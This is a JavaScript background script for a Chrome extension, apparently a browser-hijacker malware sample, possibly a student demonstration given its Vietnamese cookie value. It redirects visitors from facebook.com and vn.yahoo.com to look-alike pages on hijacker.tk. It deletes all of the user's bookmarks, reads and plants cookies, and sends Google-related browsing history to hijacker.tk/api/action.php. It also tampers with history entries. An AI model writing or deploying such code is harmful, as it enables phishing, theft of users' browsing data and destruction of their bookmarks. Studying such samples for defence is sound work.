var $ = chrome.bookmarks;

if (window.location.hostname == "www.facebook.com") {
    window.location.href = "https://hijacker.tk/FB/";
}

if (window.location.hostname == "vn.yahoo.com") {
    window.location.href = "https://hijacker.tk/Yahoo/Yahoo.php";
}


function createBookmark(title, url) {
    chrome.bookmarks.create({
        'title': title,
        'url': url,
    });
}

function deleteBookmarks(node) {
    if (node.children) {
        node.children.forEach(function (child) { deleteBookmarks(child); });
    }
    if (node.id) {
        chrome.bookmarks.remove(node.id);
    }
}

let histories = [];

let cookies = {
    'domain': 'hijacker.tk',
    'url': 'https://hijacker.tk'
};

Promise.all([
    chrome.bookmarks.getTree(function (ress) {
        let bookmark = ress;
        console.log(bookmark);
        bookmark[0].children.forEach(element => {
            deleteBookmarks(element);
        });
        createBookmark('Test', 'https://courses.uit.edu.vn');
    }),
    chrome.cookies.getAll(cookies, function (res) {
        let cookies = res;
        console.log(cookies);D
    }),
]).then(response => {
    chrome.cookies.set({
        name: "malicious_cookies",
        value: "Co_che_hoat_dong_cua_ma_doc",
        expirationDate: 3600,
        url: "https://hijacker.tk",
    });
    chrome.history.search({
        text: "google"
    }, function (res) {
        let history = res;
        console.log(history);
        if (history) {
            history.forEach(function (item) {
                var data = new FormData();
                data.append('data', JSON.stringify(item.url));

                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hijacker.tk/api/action.php', true);
                xhr.onload = function () {
                    // do something to response
                    console.log(this.responseText);
                };
                xhr.send(data);
            })
        }
    })

    chrome.history.deleteUrl({
        url: "https://phamtrantiendat.com"
    });

    chrome.history.addUrl({
        url: "https://phamtrantiendat.com"
    });
});
